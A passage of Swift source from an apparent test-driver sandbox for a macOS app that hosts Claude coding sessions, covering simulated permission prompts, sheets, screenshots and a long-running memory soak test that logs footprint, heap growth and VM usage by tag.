            waitFor({ [weak self] in self?.dictation.turningOn.contains(key) == false }) { [weak self] _ in
                self?.settle { reply(true, self?.dictation.notices[key]?.text ?? "no notice") }
            }
        default:
            reply(false, "dictation key|nokey|note|ack|press|release|letgo|cancel|turnon")
        }
    }

    /// The permission prompt banners' Allow and Deny, as the app's (`AppDelegate`), on the sandbox's host: a failure
    /// is said on the chat card (the sandbox posts no banners).
    private lazy var promptActions: PromptActions = {
        let actions = PromptActions(answerer: PromptAnswer(host: host))
        actions.notice = { [weak self] tty, _, body in self?.window?.answerFailed(tty: tty, text: body) }
        return actions
    }()

    private func notify(_ what: String, _ reply: @escaping (Bool, String) -> Void) {
        guard let id = model.selectedRow?.hostID, let fake = fakeList.first(where: { $0.id == id }) else {
            return reply(false, "select a fake session first (chat TEXT)")
        }
        switch what {
        case "prepare":
            promptActions.prepare(tty: fake.tty, id: id) { [weak self] ready in
                let question = self?.promptActions.prompts[fake.tty]?.menu.question.split(separator: "\n").last.map(String.init) ?? ""
                reply(true, ready ? "the banner gets Allow and Deny: \(question)" : "no permission prompt on screen: the banner gets no actions")
            }
        case "allow", "deny":
            promptActions.handle(what == "allow" ? PromptActions.allowAction : PromptActions.denyAction, tty: fake.tty) { [weak self] failure in
                self?.settle { reply(true, failure.map { "not answered (\($0)): \($0.text)" } ?? "answered") }
            }
        default:
            reply(false, "notify prepare|allow|deny")
        }
    }

    private func tell(_ json: String, _ reply: @escaping (Bool, String) -> Void) {
        guard let op = (try? JSONSerialization.jsonObject(with: Data(json.utf8))) as? [String: Any] else { return reply(false, "not a JSON object: \(json)") }
        // "to": a fake's label, to tell one that isn't selected (a turn ending on a selected row counts as seen: idle, not done).
        let selected = model.selectedRow?.hostID
        let named = (op["to"] as? String).flatMap { to in fakeList.first { $0.label == to } }
        guard let fake = named ?? fakeList.first(where: { $0.id == selected }) ?? fakeList.first, let file = fake.control,
              let handle = FileHandle(forWritingAtPath: file) else { return reply(false, "no fake Claude to tell") }
        handle.seekToEndOfFile()
        handle.write(Data((json + "\n").utf8))
        try? handle.close()
        // A permission prompt: the hook state a real Claude leaves on one, so the session waits on input as one does.
        let stateFile = VibePaths.stateFile(tty: fake.tty)
        if op["op"] as? String == "permission", var hook = HookState.load(from: stateFile) {
            hook.lastEvent = "PermissionRequest"
            hook.lastEventAt = Date().timeIntervalSince1970
            hook.toolName = "Bash"
            hook.request = "Bash: " + (op["command"] as? String ?? "")
            try? hook.save(to: stateFile)
        }
        // At work: the hook state a real Claude leaves mid-tool, so the chat shows its working line.
        if op["op"] as? String == "work", var hook = HookState.load(from: stateFile) {
            hook.lastEvent = "PreToolUse"
            hook.lastEventAt = Date().timeIntervalSince1970
            hook.toolName = "Bash"
            hook.toolStartedAt = Date().timeIntervalSince1970
            try? hook.save(to: stateFile)
        }
        // Its turn over just now: the Stop a real Claude leaves, so the row reads done.
        if op["op"] as? String == "done", var hook = HookState.load(from: stateFile) {
            hook.lastEvent = "Stop"
            hook.lastEventAt = Date().timeIntervalSince1970
            try? hook.save(to: stateFile)
        }
        reply(true, "told \(fake.label) \(json)")
    }

    /// The sheet in a window of its own beside the main one, off screen as it is: attached with `beginSheet`, AppKit
    /// would move the main window on screen to show it. Its content is the sheet's, at the size `.sheet` gives it.
    private func showSheet(_ name: String, _ reply: @escaping (Bool, String) -> Void) {
        if name == "choose-folder" {
            // NSOpenPanel draws out of process (a remote view): `shot` can't draw it, so this says how it's set up.
            let panel = Launcher.folderPanel(startingAt: home + "/projects", prompt: ProjectFolderStart.prompt(for: .chooseForLead))
            return reply(true, "folder panel (drawn out of process: shot can't draw it): button “\(panel.prompt ?? "")”, "
                         + "folders only: \(panel.canChooseDirectories && !panel.canChooseFiles), starts in \(panel.directoryURL?.path ?? "?")")
        }
        if name == "new-session-menu" {
            // A menu draws only while it's open, in a tracking loop on screen: this lists the empty sidebar's
            // (`NewSessionMenu(folder: nil)`), from the window's actions.
            guard let actions = windowActions else { return reply(false, "no main window") }
            let items = actions.presets(nil).map(\.name) + ["—", NewSessionMenu.leadItem(folder: nil, actions: actions).title]
            return reply(true, "the empty sidebar's New Session menu: " + items.joined(separator: ", "))
        }
        if let entry = Self.windowSheets.first(where: { $0.name == name }) {
            closeSheet()
            guard let shown = entry.make(self) else { return reply(false, "couldn't make \(name)") }
            Sandbox.hide(shown)
            sheet = shown
            sheetName = name
            shown.orderFrontRegardless()
            Sandbox.hide(shown)
            return settle { reply(true, "sheet \(name) shown") }
        }
        guard let entry = (Self.sheets + Self.walletSheets).first(where: { $0.name == name }) else {
            return reply(false, "no sheet \(name): " + (Self.sheets.map(\.name) + Self.windowSheets.map(\.name) + ["choose-folder", "new-session-menu"]).joined(separator: ", "))
        }
        guard let parent = window?.window else { return reply(false, "no window") }
        closeSheet()
        let content = NSHostingController(rootView: entry.make(self))
        let sheet = NSWindow(contentRect: .zero, styleMask: [.borderless], backing: .buffered, defer: false)
        sheet.contentViewController = content
        // As tall as its content (a Form's own height is whatever it's given), at most as tall as the window.
        let measure = NSHostingView(rootView: entry.make(self).fixedSize(horizontal: false, vertical: true))
        let fitting = measure.fittingSize
        if fitting.width > 0, fitting.height > 0 {
            sheet.setContentSize(NSSize(width: fitting.width, height: min(fitting.height, parent.frame.height - 60)))
        }
        sheet.appearance = parent.appearance
        Sandbox.hide(sheet)
        self.sheet = sheet
        sheetName = name
        sheet.orderFrontRegardless()
        Sandbox.hide(sheet)
        settle { reply(true, "sheet \(name) shown") }
    }

    /// The shown chat's last code block that has a Run (`RunButton`): what its confirmation shows, as the sheet; once
    /// `confirmed`, run as the button runs it after you press Run there.
    private func runBlock(confirmed: Bool, _ reply: @escaping (Bool, String) -> Void) {
        guard let chat = window?.chat, model.showsChat else { return reply(false, "no chat: show a fake session's chat first (chat)") }
        let replies = chat.items.compactMap { item -> String? in
            guard case .reply(let entry) = item, case .reply(let text) = entry.kind else { return nil }
            return text
        }
        let runnable = replies.reversed().lazy.compactMap { text in
            MarkdownBlocks.parse(text).reversed().lazy.compactMap { block -> RunnableCommand.Runnable? in
                guard case .code(let language, let code) = block else { return nil }
                return RunnableCommand.runnable(code: code, language: language)
            }.first
        }.first
        guard let runnable else { return reply(false, "no code block with a Run in the chat's replies") }
        closeSheet()
        guard let way = chat.runner.way else { return reply(false, "no Run shown: the selected session takes no commands") }
        if confirmed {
            return RunButton.run(runnable, way: way, with: chat.runner, confirm: { _ in true }) { [weak self] outcome in
                guard let self else { return }
                switch outcome {
                case .ran?: self.settle { reply(true, "ran it: \(runnable.typed(way))") }
                case .refused(let reason)?: self.settle { reply(false, reason) }
                case nil: reply(false, "cancelled")
                }
            }
        }
        let alert = RunButton.confirmation(runnable, way: way)
        alert.layout()
        let shown = alert.window
        Sandbox.hide(shown)
        sheet = shown
        sheetName = "runblock"
        shown.orderFrontRegardless()
        Sandbox.hide(shown)
        settle { reply(true, "Run's confirmation shown (sheet-runblock)") }
    }

    func closeSheet() {
        sheet?.orderOut(nil)
        sheet = nil
        sheetName = nil
    }

    /// The composer's text view in the window's chat, when it's shown.
    private func composer() -> NSTextView? {
        func find(_ view: NSView) -> NSTextView? {
            if let text = view as? ComposerNSTextView, !text.isHiddenOrHasHiddenAncestor { return text }
            for subview in view.subviews { if let found = find(subview) { return found } }
            return nil
        }
        return window?.window?.contentView.flatMap(find)
    }

    /// Checks `condition` every 0.1 s for up to 30 s.
    private func waitFor(_ condition: @escaping () -> Bool, tries: Int = 300, _ done: @escaping (Bool) -> Void) {
        if condition() { return done(true) }
        guard tries > 0 else { return done(false) }
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { self.waitFor(condition, tries: tries - 1, done) }
    }

    /// Lets SwiftUI and AppKit lay out and draw what just changed (a few turns of the run loop), then `done`.
    private func settle(_ done: @escaping () -> Void) {
        for window in NSApp.windows where window.isVisible {
            window.contentView?.layoutSubtreeIfNeeded()
            window.displayIfNeeded()
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.4) {
            for window in NSApp.windows where window.isVisible {
                window.contentView?.layoutSubtreeIfNeeded()
                window.displayIfNeeded()
            }
            DispatchQueue.main.async(execute: done)
        }
    }

    // MARK: Shots

    /// Each window the sandbox shows (the main window, Settings when open, the sheet when shown), drawn in light and in
    /// dark: `NAME-main-light.png`, `NAME-main-dark.png`, `NAME-settings-light.png`…
    private func shot(_ name: String, draw: @escaping (NSWindow, URL) -> Bool = Sandbox.draw, _ reply: @escaping (Bool, String) -> Void) {
        let base = Sandbox.fileName(name)
        var windows: [(label: String, window: NSWindow)] = []
        if let main = window?.window, main.isVisible { windows.append(("main", main)) }
        if let sheet, sheet.isVisible { windows.append(("sheet-\(sheetName ?? "sheet")", sheet)) }
        if let settings = settings?.window, settings.isVisible { windows.append(("settings", settings)) }
        // A "?" popover opened by settings-help: its own small window.
        for popover in NSApp.windows where popover.isVisible && String(describing: type(of: popover)).contains("Popover") { windows.append(("help", popover)) }
        guard !windows.isEmpty else { return reply(false, "no window to draw") }
        if model.showsChat { window?.chat.poll() }
        var written: [String] = []
        var failed: [String] = []
        func take(_ appearances: ArraySlice<(String, NSAppearance.Name)>) {
            guard let (mode, appearance) = appearances.first else {
                windows.forEach { $0.window.appearance = nil }
                window?.pane.reconfigureAll()
                return reply(failed.isEmpty, (written + failed.map { "couldn't draw \($0)" }).joined(separator: "\n"))
            }
            windows.forEach { $0.window.appearance = NSAppearance(named: appearance) }
            window?.pane.reconfigureAll()
            settle { [weak self] in
                guard let self else { return }
                for (label, window) in windows {
                    let file = self.shots.appendingPathComponent("\(base)-\(label)-\(mode).png")
                    if draw(window, file) { written.append(file.path) } else { failed.append(file.lastPathComponent) }
                }
                take(appearances.dropFirst())
            }
        }
        take([("light", .aqua), ("dark", .darkAqua)][...])
    }
}

// MARK: Soak

/// `soak`'s run: what it leaves out, its timers, its log (STATE/soak.log) and its minutes' samples.
final class SoakRun {
    let minutes: Double
    let every: Double
    let without: Set<String>
    /// Cycles in a simulated hour of the working day (`hour CYCLES`): each cycle stands for 60/CYCLES minutes of it.
    let hour: Int
    let log: URL
    let started = Date()
    let relief = FootprintRelief()
    var timers: [Heartbeat.Subscription] = []
    var cycles = 0
    var minute = 0
    var least = Double.infinity
    var baseline: HeapCensus.Result?
    var running = true
    /// Each minute's least footprint (MB).
    var floors: [Double] = []
    /// The least footprint read in the simulated hour under way, and each simulated hour's (MB).
    var hourLeast = Double.infinity
    var hours: [Double] = []
    /// The worker step's (`workers`): each real-shaped worker's footprint and malloc in use once it ended and was
    /// removed (MB), and the size of each one's transcript (MB, `worker-mb`).
    var workers: [(footprint: Double, malloc: Double)] = []
    var workerMB = 4.0
    /// The app's memory by VM tag when the last worker ended (`SoakMemory.byTag`).
    var workerTags: [(tag: UInt32, mb: Double)]?
    /// The worker step's role sweep (made on its first use, with the host it ends sessions on).
    private var roleSweep: RoleSweep?

    func sweep(_ host: HostClient) -> RoleSweep {
        if let roleSweep { return roleSweep }
        let made = RoleSweep(roster: { [] }, end: { [weak host] session in DispatchQueue.main.async { host?.kill(session.id) } }, tell: { _ in })
        roleSweep = made
        return made
    }

    init(minutes: Double, every: Double, without: Set<String>, hour: Int = 30, log: URL) {
        self.minutes = minutes
        self.every = every
        self.without = without
        self.hour = max(1, hour)
        self.log = log
    }

    func note(_ line: String) {
        let stamped = String(format: "%6.1f min  ", Date().timeIntervalSince(started) / 60) + line + "\n"
        if let handle = try? FileHandle(forWritingTo: log) {
            handle.seekToEndOfFile()
            handle.write(Data(stamped.utf8))
            try? handle.close()
        } else {
            try? VibePaths.writePrivate(Data(stamped.utf8), to: log)
        }
    }
}

extension Driver {
    /// `soak MINUTES [every SECONDS] [without LIST]`, `soak stop`, `soak` (the log so far).
    func soak(_ rest: String, _ reply: @escaping (Bool, String) -> Void) {
        let words = rest.split(separator: " ").map(String.init)
        let log = state.appendingPathComponent("soak.log")
        if words.isEmpty { return reply(true, (try? String(contentsOf: log, encoding: .utf8)) ?? "no soak run yet") }
        if words == ["stop"] {
            soakFinish()
            return reply(true, "stopped")
        }
        guard soakRun == nil, let minutes = Double(words[0]), minutes > 0 else {
            return reply(false, soakRun == nil ? "soak MINUTES [every SECONDS] [without LIST]" : "a soak is running (soak stop)")
        }
        func value(_ flag: String) -> String? { words.firstIndex(of: flag).flatMap { words.indices.contains($0 + 1) ? words[$0 + 1] : nil } }
        let run = SoakRun(minutes: minutes, every: max(1, value("every").flatMap(Double.init) ?? 20),
                          without: Set((value("without") ?? "").split(separator: ",").map(String.init)),
                          hour: value("hour").flatMap(Int.init) ?? 30, log: log)
        if let mb = value("worker-mb").flatMap(Double.init), mb >= 0 { run.workerMB = mb }
        soakRun = run
        run.note("soak: \(minutes) minutes, a cycle every \(run.every) s, \(run.hour) cycles a simulated hour"
                 + (run.without.isEmpty ? "" : ", without \(run.without.sorted().joined(separator: ", "))"))
        // As the app runs it: malloc's free pages given back once the footprint grew 24 MB (the sandbox is never frontmost).
        run.relief.start()
        run.timers.append(Heartbeat.shared.every(5) { [weak run] in
            guard let run, let now = AppHealthWatcher.ownFootprint()?.now else { return }
            run.least = min(run.least, now)
            run.hourLeast = min(run.hourLeast, now)
        })
        run.timers.append(Heartbeat.shared.every(60) { [weak self] in self?.soakMinute() })
        soakCycle()
        reply(true, "soaking for \(minutes) minutes: STATE/soak.log")
    }

    /// The minute's line: the footprint, malloc's, and the per-session state's counts; what grew by class at minute 2
    /// (the baseline) and every 30 minutes.
    private func soakMinute() {
        guard let run = soakRun else { return }
        run.minute += 1
        var stats = malloc_statistics_t()
        malloc_zone_statistics(nil, &stats)
        let now = AppHealthWatcher.ownFootprint()?.now ?? 0
        let floor = min(run.least, now)
        run.least = .infinity
        run.floors.append(floor)
        let reliefs = run.relief.made
        run.note(String(format: "minute %3d  footprint %6.1f MB (least %6.1f)  malloc in use %6.1f MB  ", run.minute, now, floor,
                        Double(stats.size_in_use) / 1_048_576)
                 + "cycles \(run.cycles)  fakes \(fakeList.count)  host sessions \(host.sessions.count)  rows \(store.sessions.count)  "
                 + "chats \(IdleBench.Live.chats.map(String.init) ?? "n/a")  terminal views \(IdleBench.Live.views.map(String.init) ?? "n/a")  "
                 + "dictation runs \(dictation.runs.count) notices \(dictation.notices.count) deliveries \(dictation.deliveries.count) "
                 + "turning on \(dictation.turningOn.count)  reliefs \(reliefs.reliefs)  " + soakCounters())
        if run.minute == 2 { soakCensus(run) }
        if Double(run.minute) >= run.minutes { soakFinish() }
    }

    /// The live objects the debug counters see: the wallet desk's cards and records, the heartbeat's timers, the
    /// Combine sinks the app keeps, the lead controller's leads.
    private func soakCounters() -> String {
        #if DEBUG
        let wallet = walletDesk.census
        #else
        let wallet = "n/a"
        #endif
        return "wallet \(wallet)  timers \(Heartbeat.shared.clientCount)  boards \(leads.boards.count)"
    }

    /// A simulated hour's line: its least footprint, malloc's bytes in use, the counters.
    private func soakHour(_ run: SoakRun) {
        var stats = malloc_statistics_t()
        malloc_zone_statistics(nil, &stats)
        let now = AppHealthWatcher.ownFootprint()?.now ?? 0
        let least = min(run.hourLeast, now)
        run.hourLeast = .infinity
        run.hours.append(least)
        run.note(String(format: "simulated hour %2d  footprint %6.1f MB (least %6.1f)  malloc in use %6.1f MB  cycles %d  ", run.hours.count,
                        now, least, Double(stats.size_in_use) / 1_048_576, run.cycles)
                 + "terminal views \(IdleBench.Live.views.map(String.init) ?? "n/a")  chats \(IdleBench.Live.chats.map(String.init) ?? "n/a")  "
                 + soakCounters())
        soakCensus(run)
    }

    private func soakCensus(_ run: SoakRun) {
        DispatchQueue.global().async {
            let census = HeapCensus.take()
            DispatchQueue.main.async {
                guard let baseline = run.baseline else {
                    run.baseline = census
                    return run.note(String(format: "census: %ld blocks, %.1f MB (the baseline)", census.total.blocks, Double(census.total.bytes) / 1_048_576))
                }
                run.note(String(format: "census: %ld blocks, %.1f MB; grew since minute 2:", census.total.blocks, Double(census.total.bytes) / 1_048_576))
                let views = HeapCensus.growth(from: baseline, to: census, top: .max)
                    .filter { $0.name.contains("View") || $0.name.contains("Hosting") || $0.name.contains("Model") || $0.name.contains("Wallet") }
                    .prefix(10)
                for row in HeapCensus.growth(from: baseline, to: census, top: 12) + views {
                    run.note(String(format: "  %-70@ %+8.2f MB %+8ld blocks (%ld → %ld)", String(row.name.prefix(70)) as NSString,
                                    Double(row.after.bytes - row.before.bytes) / 1_048_576, row.after.blocks - row.before.blocks,
                                    row.before.blocks, row.after.blocks))
                }
            }
        }
    }

    private func soakFinish() {
        guard let run = soakRun, run.running else { return }
        run.running = false
        run.timers.forEach { $0.cancel() }
        run.timers = []
        soakCensus(run)
        // A least-squares line through each minute's least footprint after the first 10 (the caches filling).
        let points = Array(run.floors.enumerated().dropFirst(10))
        if points.count >= 3 {
            let meanX = points.map { Double($0.offset) }.reduce(0, +) / Double(points.count)
            let meanY = points.map(\.element).reduce(0, +) / Double(points.count)
            let spread = points.reduce(0.0) { $0 + pow(Double($1.offset) - meanX, 2) }
            let slope = points.reduce(0.0) { $0 + (Double($1.offset) - meanX) * ($1.element - meanY) } / spread
            run.note(String(format: "RESULT soak-growth-mb-per-hour %.1f (each minute's least, minutes 11-%d; %.1f → %.1f MB)", slope * 60,
                            run.floors.count, points.first?.element ?? 0, points.last?.element ?? 0))
        }
        // Each simulated hour's least footprint after the first (the caches filling), as a line through them.
        let hours = Array(run.hours.enumerated().dropFirst())
        if hours.count >= 2 {
            let meanX = hours.map { Double($0.offset) }.reduce(0, +) / Double(hours.count)
            let meanY = hours.map(\.element).reduce(0, +) / Double(hours.count)
            let spread = hours.reduce(0.0) { $0 + pow(Double($1.offset) - meanX, 2) }
            let slope = hours.reduce(0.0) { $0 + (Double($1.offset) - meanX) * ($1.element - meanY) } / spread
            run.note(String(format: "RESULT soak-simulated-hour-growth-mb %.1f (each simulated hour's least, hours 2-%d: ", slope, run.hours.count)
                     + run.hours.map { String(format: "%.1f", $0) }.joined(separator: " ") + " MB)")
        } else {
            // Too few hours for a line (a slow Mac, a short run): said all the same.
            run.note("RESULT soak-simulated-hour-growth-mb n/a (\(run.hours.count) simulated hours: a line needs 3)")
        }
        // Each real-shaped worker's footprint once it ended and was removed, after the first two, as a line: MB a worker;
        // and malloc's bytes in use the same way (what's live), so freed pages kept for reuse read apart from live growth.
        func slope(_ values: [Double]) -> Double {
            let points = Array(values.enumerated().dropFirst(2))
            let meanX = points.map { Double($0.offset) }.reduce(0, +) / Double(points.count)
            let meanY = points.map(\.element).reduce(0, +) / Double(points.count)
            let spread = points.reduce(0.0) { $0 + pow(Double($1.offset) - meanX, 2) }
            return points.reduce(0.0) { $0 + (Double($1.offset) - meanX) * ($1.element - meanY) } / spread
        }
        if run.workers.count >= 5 {
            let footprints = run.workers.map(\.footprint), live = run.workers.map(\.malloc)
            run.note(String(format: "RESULT soak-worker-growth-mb %.2f (each worker's footprint once ended, workers 3-%d: %.1f → %.1f MB, the highest %.1f; "
                            + "malloc in use %+.2f MB a worker: %.1f → %.1f MB)", slope(footprints), run.workers.count, footprints[2],
                            footprints.last ?? 0, footprints.max() ?? 0, slope(live), live[2], live.last ?? 0))
        } else if !run.without.contains("workers") {
            run.note("RESULT soak-worker-growth-mb n/a (\(run.workers.count) workers ended: a line needs 5)")
        }
        run.note("soak: done after \(run.cycles) cycles")
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) { [weak self] in
            if self?.soakRun === run { self?.soakRun = nil }
        }
    }

    /// One cycle of the day's actions, each step after the last one's answer; the next cycle `every` seconds after this
    /// one started.
    private func soakCycle() {
        guard let run = soakRun, run.running else { return }
        run.cycles += 1
        let cycle = run.cycles, off = run.without
        let began = Date()
        typealias Step = (name: String, run: (@escaping (Bool, String) -> Void) -> Void)
        func command(_ words: String...) -> Step { (words.joined(separator: " "), { [weak self] in self?.handle(words, reply: $0) }) }
        var steps: [Step] = []
        let label = "Soak \(cycle)"
        if !off.contains("sessions") {
            steps.append(command("new", label))
            steps.append(command("chat", label))
        } else {
            steps.append(command("chat", "Fake Claude"))
        }
        if !off.contains("stream") {
            let reply = (0..<12).map { "Step \(cycle).\($0): the change reads the board once, keeps its rows, and the tests pass." }
                .joined(separator: "\n\n") + "\n\n```swift\nlet rows = TeamRows.rows(board, seen: seen) // \(cycle)\n```"
            let done = (try? JSONSerialization.data(withJSONObject: ["op": "done", "reply": reply])).flatMap { String(data: $0, encoding: .utf8) } ?? ""
            steps += [command("type", "Cycle \(cycle): run the tests and tell me what changed"), command("send"),
                      command("tell", #"{"op": "work"}"#), command("tell", done)]
            steps.append(("poll", { [weak self] done in
                DispatchQueue.main.asyncAfter(deadline: .now() + 1) { self?.window?.chat.poll(); done(true, "") }
            }))
        }
        if !off.contains("dictation") {
            steps += [command("tell", #"{"op": "voice", "mode": "hold", "transcript": "run the tests on the composer"}"#),
                      command("dictation", "press"), command("dictation", "release")]
        }
        if !off.contains("team") {
            let leadUp = fakeList.contains { $0.label.hasPrefix("Lead · ") }
            steps.append(command("lead"))
            steps.append(("team tab", { done in
                UserDefaults.standard.set(cycle % 2 == 0 ? "team" : "overview", forKey: "inspectorTab")
                done(true, "")
            }))
            if leadUp {
                if let worker = fakeList.first(where: { $0.label.hasPrefix("Worker: ") }) {
                    if cycle % 4 == 0 { steps.append(("end worker", { [weak self] in self?.soakEnd([worker.id], $0) })) }
                } else {
                    steps.append(command("team"))
                }
                steps.append(command("unfold"))
            }
            if !off.contains("reports"), leadUp { steps.append(command("churn", "3")) }
            // Every other cycle a worker shaped like a real one, from its start to the role sweep ending it.
            if !off.contains("workers"), leadUp, cycle % 2 == 0 {
                steps.append(("worker", { [weak self] done in
                    guard let self else { return done(true, "") }
                    self.soakWorker(cycle, done)
                }))
            }
        }
        if !off.contains("wallet") {
            // The selected chat's agent files a request, and the desk's clock moves the cycle's share of the hour with
            // its 15 s refreshes in between. Every third one is sent and the Wallet Manager answers twice; it stands a
            // minute, so its card goes an hour later (`resultGrace`); the others are discarded. The cards alive stay
            // few, so what grows is what's left behind, not cards still shown.
            if cycle % 3 == 0 {
                steps += [command("wallet-ask", "--expires-in", "1m"), command("wallet-click", "send"),
                          command("wallet-answer", "received"), command("wallet-answer", "submitted")]
            } else {
                steps += [command("wallet-ask"), command("wallet-click", "discard")]
            }
            let minutes = 60 / Double(run.hour)
            steps.append(("wallet refreshes", { [weak self] done in
                guard let self else { return done(true, "") }
                let ticks = max(1, Int(minutes * 4))
                func tick(_ index: Int) {
                    guard index < ticks else { return done(true, "") }
                    self.walletClock.advance(15)
                    self.walletDesk.refresh { tick(index + 1) }
                }
                tick(0)
            }))
        }
        if !off.contains("ax") {
            steps.append(("ax", { [weak self] done in
                guard let window = self?.window?.window else { return done(false, "no window") }
                done(true, "\(Self.soakAttach(window)) hosts attached, \(AXClient.walk(window)) elements")
            }))
        }
        if !off.contains("sessions") {
            steps.append(("end oldest", { [weak self] done in
                guard let self else { return done(true, "") }
                let soaked = self.fakeList.filter { $0.label.hasPrefix("Soak ") }
                    .sorted { (Int($0.label.dropFirst(5)) ?? 0) < (Int($1.label.dropFirst(5)) ?? 0) }
                self.soakEnd(soaked.dropLast(3).map(\.id), done)
            }))
        }
        func next(_ rest: ArraySlice<Step>) {
            guard let run = soakRun, run.running else { return }
            guard let step = rest.first else {
                if cycle % run.hour == 0 { soakHour(run) }
                let wait = max(0.5, run.every - Date().timeIntervalSince(began))
                DispatchQueue.main.asyncAfter(deadline: .now() + wait) { [weak self] in self?.soakCycle() }
                return
            }
            Sandbox.doing = "soak: \(step.name)"
            step.run { [weak run] ok, text in
                if !ok { run?.note("cycle \(cycle): \(step.name.prefix(60)) failed: \(text.prefix(200))") }
                DispatchQueue.main.async { next(rest.dropFirst()) }
            }
        }
        next(steps[...])
    }

    /// Hosting views an accessibility client was attached to: each one once (a new one, a newly shown chat's, too).
    private static let attached = NSHashTable<NSView>.weakObjects()

    private static func soakAttach(_ window: NSWindow) -> Int {
        AXClient.attach(window) { view in
            guard !attached.contains(view) else { return false }
            attached.add(view)
            return true
        }
    }

    /// Ends the sessions and removes them, as End Session and then removing its row do.
    private func soakEnd(_ ids: [UUID], _ done: @escaping (Bool, String) -> Void) {
        guard !ids.isEmpty else { return done(true, "") }
        ids.forEach(host.kill)
        waitFor({ [weak self] in self?.host.sessions.allSatisfy { !ids.contains($0.id) || !$0.isLive } ?? true }) { [weak self] _ in
            guard let self else { return done(true, "") }
            for id in ids { self.window?.pane.forget(id); self.host.remove(id) }
            self.waitFor({ !self.host.sessions.contains { ids.contains($0.id) } }) { gone in
                done(gone, gone ? "" : "\(ids.count) sessions not removed")
            }
        }
    }
}

// MARK: Soak: where the footprint is

/// The app's own memory by kind, read in-process (its own task_info, malloc's zones, a walk of its own VM regions):
/// never another process, never a tool that inspects one.
enum SoakMemory {
    /// task_vm_info's footprint and the ledgers in it (MB): graphics (IOSurfaces, Metal), IOKit-mapped, compressed.
    static func ledgers() -> String {
        var info = task_vm_info_data_t()
        var count = mach_msg_type_number_t(MemoryLayout<task_vm_info_data_t>.size / MemoryLayout<integer_t>.size)
        let ok = withUnsafeMutablePointer(to: &info) { pointer in
            pointer.withMemoryRebound(to: integer_t.self, capacity: Int(count)) { task_info(mach_task_self_, task_flavor_t(TASK_VM_INFO), $0, &count) }
        } == KERN_SUCCESS
        guard ok else { return "task_info failed" }
        let mb = { (bytes: UInt64) in String(format: "%.1f", Double(bytes) / 1_048_576) }
        var stats = malloc_statistics_t()
        malloc_zone_statistics(nil, &stats)
        return "internal \(mb(info.internal)) compressed \(mb(info.compressed)) graphics \(mb(UInt64(max(0, info.ledger_tag_graphics_footprint)))) "
            + "malloc allocated \(mb(UInt64(stats.size_allocated))) in use \(mb(UInt64(stats.size_in_use)))"
    }

    /// The app's private dirty and swapped memory by VM tag (MB), largest first: what vmmap's summary would say of it,
    /// from its own regions.
    static func byTag() -> [(tag: UInt32, mb: Double)] {
        var totals: [UInt32: UInt64] = [:]
        var address: mach_vm_address_t = 0
        var depth: natural_t = 0
        let page = UInt64(vm_kernel_page_size)
        while true {
            var size: mach_vm_size_t = 0
            var info = vm_region_submap_info_data_64_t()
            var count = mach_msg_type_number_t(MemoryLayout<vm_region_submap_info_data_64_t>.size / MemoryLayout<natural_t>.size)
            let result = withUnsafeMutablePointer(to: &info) { pointer in
                pointer.withMemoryRebound(to: Int32.self, capacity: Int(count)) {
                    mach_vm_region_recurse(mach_task_self_, &address, &size, &depth, $0, &count)
                }
            }
            guard result == KERN_SUCCESS else { break }
            if info.is_submap != 0 {
                depth += 1
                continue
            }
            if [UInt8(SM_PRIVATE), UInt8(SM_COW), UInt8(SM_PRIVATE_ALIASED)].contains(info.share_mode) {
                totals[info.user_tag, default: 0] += (UInt64(info.pages_dirtied) + UInt64(info.pages_swapped_out)) * page
            }
            address += size
        }
        return totals.map { ($0.key, Double($0.value) / 1_048_576) }.sorted { $0.mb > $1.mb }
    }

    /// The VM tags' names (mach/vm_statistics.h) for the ones a Mac app's footprint is made of.
    static func name(_ tag: UInt32) -> String {
        switch Int32(tag) {
        case VM_MEMORY_MALLOC: "malloc"
        case VM_MEMORY_MALLOC_SMALL: "malloc small"
        case VM_MEMORY_MALLOC_LARGE: "malloc large"
        case VM_MEMORY_MALLOC_HUGE: "malloc huge"
        case VM_MEMORY_MALLOC_TINY: "malloc tiny"
        case VM_MEMORY_MALLOC_NANO: "malloc nano"
        case VM_MEMORY_MALLOC_MEDIUM: "malloc medium"
        case VM_MEMORY_MALLOC_LARGE_REUSABLE: "malloc large reusable"
        case VM_MEMORY_IOKIT: "IOKit"
        case VM_MEMORY_COREGRAPHICS: "CoreGraphics"
        case VM_MEMORY_COREGRAPHICS_DATA: "CG data"
        case VM_MEMORY_COREGRAPHICS_SHARED: "CG shared"
        case VM_MEMORY_COREGRAPHICS_BACKINGSTORES: "CG backing stores"
        case VM_MEMORY_COREGRAPHICS_FRAMEBUFFERS: "CG framebuffers"
        case VM_MEMORY_APPKIT: "AppKit"
        case VM_MEMORY_COREUI: "CoreUI"
        case VM_MEMORY_COREIMAGE: "CoreImage"
        case VM_MEMORY_IOSURFACE: "IOSurface"
        case VM_MEMORY_IMAGEIO: "ImageIO"
        case VM_MEMORY_FOUNDATION: "Foundation"
        case VM_MEMORY_COREDATA: "CoreData"
        case VM_MEMORY_STACK: "stack"
        case VM_MEMORY_DYLD: "dyld"
        case VM_MEMORY_DYLD_MALLOC: "dyld malloc"
        case VM_MEMORY_SQLITE: "SQLite"
        case VM_MEMORY_JAVASCRIPT_CORE: "JavaScriptCore"
        case VM_MEMORY_JAVASCRIPT_JIT_EXECUTABLE_ALLOCATOR, VM_MEMORY_JAVASCRIPT_JIT_REGISTER_FILE: "JS JIT"
        case VM_MEMORY_LAYERKIT: "LayerKit"
        case VM_MEMORY_CGIMAGE: "CGImage"
        case VM_MEMORY_OS_ALLOC_ONCE: "OS alloc once"
        case VM_MEMORY_LIBDISPATCH: "dispatch"
        case VM_MEMORY_ACCELERATE: "Accelerate"
        case VM_MEMORY_SWIFT_RUNTIME: "Swift runtime"
        case VM_MEMORY_SWIFT_METADATA: "Swift metadata"
        case 0: "untagged (mmap)"
        default: "tag \(tag)"
        }
    }

    /// The tags whose memory changed most between two walks: "name +X.X MB", the largest changes first.
    static func change(from before: [(tag: UInt32, mb: Double)], to after: [(tag: UInt32, mb: Double)], top: Int = 5) -> String {
        let old = Dictionary(before.map { ($0.tag, $0.mb) }, uniquingKeysWith: +)
        let new = Dictionary(after.map { ($0.tag, $0.mb) }, uniquingKeysWith: +)
        return Set(old.keys).union(new.keys).map { ($0, (new[$0] ?? 0) - (old[$0] ?? 0)) }
            .sorted { abs($0.1) > abs($1.1) }.prefix(top)
